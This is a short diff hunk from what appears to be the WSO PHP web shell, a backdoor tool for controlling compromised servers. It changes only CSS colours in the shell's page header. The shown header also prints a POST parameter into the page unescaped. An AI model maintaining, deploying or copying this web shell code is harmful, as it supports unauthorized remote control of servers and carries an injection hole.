@@ -125,8 +125,8 @@ function printHeader() {
 <html><head><meta http-equiv='Content-Type' content='text/html; charset=<?=$_POST['charset']?>'><title><?=$_SERVER['HTTP_HOST']?> - WSO <?=VERSION?></title>
 <style>
 	body {background-color:#000;color:#e1e1e1;}
-	body,td,th	{font:10pt tahoma,arial,verdana,sans-serif,Lucida Sans;margin:0;vertical-align:top;color:#C3C3C3;}
-	table.info	{color:#fff;background-color:#000;}
+	body,td,th	{font:10pt tahoma,arial,verdana,sans-serif,Lucida Sans;margin:0;vertical-align:top;}
+	table.info	{color:#C3C3C3;background-color:#000;}
 	span,h1,a	{color:<?=$color?> !important;}
 	span		{font-weight:bolder;}
 	h1			{border-left:5px solid teal;padding:2px 5px;font:14pt Verdana;background-color:#222;margin:0px;}
